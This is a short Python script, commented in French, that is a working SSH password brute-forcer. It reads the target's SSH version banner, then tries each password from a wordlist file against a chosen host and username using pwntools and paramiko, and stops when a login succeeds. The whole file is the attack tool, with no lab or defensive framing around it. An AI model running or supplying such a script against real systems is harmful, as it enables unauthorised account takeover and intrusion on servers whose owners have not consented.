import socket
import paramiko
from pwn import *

def get_ssh_version(ip, port=22, timeout=3):
    """ Tries to grab the SSH banner to identify the SSH version. """
    s = socket.socket()
    s.settimeout(timeout)
    try:
        s.connect((ip, port))
        # Recevoir le banner (normalement la première ligne envoyée par le serveur SSH)
        banner = s.recv(100).decode()
        return banner.strip()
    except Exception as e:
        print(f"Failed to connect to {ip} on port {port}: {str(e)}")
    finally:
        s.close()

# Entrée utilisateur pour le host et le username
host = input("Enter the SSH host address: ")
username = input("Enter the SSH username: ")

# Afficher la version de OpenSSH du host
ssh_version = get_ssh_version(host)
if ssh_version:
    print(f"SSH Version on {host}: {ssh_version}")
else:
    print("Unable to retrieve SSH version.")

attempts = 0

# Lire la liste des mots de passe
with open("passw.txt", "r") as password_list:  # Le liste de mots passe passw.txt variable 
    for password in password_list:
        password = password.strip("\n")
        try:
            print(f"[{attempts}] Attempting password: '{password}'!")
            # Tentative de connexion
            response = ssh(host=host, user=username, password=password, timeout=5)
            if response.connected():
                print(f"[>] Valid password found: '{password}'!")
                response.close()
                break
            response.close()
        except paramiko.ssh_exception.AuthenticationException:
            print(f"[x] Invalid password!")
        except paramiko.ssh_exception.SSHException as e:
            print(f"[!] SSH Exception: {str(e)}")
        except Exception as e:
            print(f"[!] Unexpected error: {str(e)}")
        finally:
            attempts += 1  # Incrémenter les tentatives après chaque essai

print(f"Number of attempts: {attempts}")
